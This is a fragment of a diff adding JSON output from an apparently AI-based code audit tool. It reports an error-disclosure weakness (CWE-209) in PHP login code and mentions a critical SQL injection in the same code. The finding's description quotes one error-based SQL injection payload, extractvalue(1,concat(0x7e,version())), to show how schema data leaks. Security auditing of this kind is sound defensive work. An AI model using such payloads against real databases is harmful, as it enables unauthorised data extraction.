+          "severity": "medium",
+          "line": 85,
+          "description": "print_r(mysql_error()) on the failure branch outputs raw MySQL error messages to the browser. Combined with the SQL injection vulnerability, this enables error-based extraction: payloads like extractvalue(1,concat(0x7e,version())) trigger descriptive errors that leak database schema, table names, and column data to the unauthenticated attacker.",
+          "remediation": "Suppress error output in production (error_reporting(0) was already set on line 41) and avoid echoing mysql_error(). Log errors server-side only and return generic messages to users.",
+          "codeSnippet": "print_r(mysql_error());",
+          "cwe": "CWE-209",
+          "owasp": "A04:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "print_r(mysql_error()) on line 85 outputs raw MySQL error messages in the failure branch, directly enabling error-based SQLi data extraction when combined with the injection on line 57."
+        }
+      ],
+      "summary": "Critical SQL injection via unsanitized $_POST['uname'] and $_POST['passwd'] concatenated into mysql_query(), compounded by verbose mysql_error() output enabling error-based data extraction. [2 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 2367,
+        "completion": 1817,
+        "total": 4184
+      }
+    }
+  ]
+}
